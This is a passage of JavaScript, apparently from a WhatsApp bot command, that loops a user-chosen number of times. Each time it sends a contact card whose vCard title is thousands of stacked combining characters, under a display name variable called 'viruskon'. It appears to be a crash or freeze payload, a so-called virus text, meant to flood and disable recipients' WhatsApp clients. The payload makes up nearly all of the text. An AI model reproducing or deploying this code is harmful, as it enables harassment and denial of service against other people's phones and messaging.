if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${viruskon}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;`${viruskon}`\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞̒͛ͧ̊ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.̵̸̡̧̛͚̞̼͕̞̠͖̙̭͚̥̪̥̳͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̃ͤ̓͌̒̾̀̚͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.̵̨̡͈͉͙̺̭̝̪̖̱͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̸̷̳̟̓̿ͧ̂̄ͮ̽ͮ̄ͦ̃́͋̒̚͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̴̻̗̜̗͎̘̲̣͖͔̠̣̯ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄͘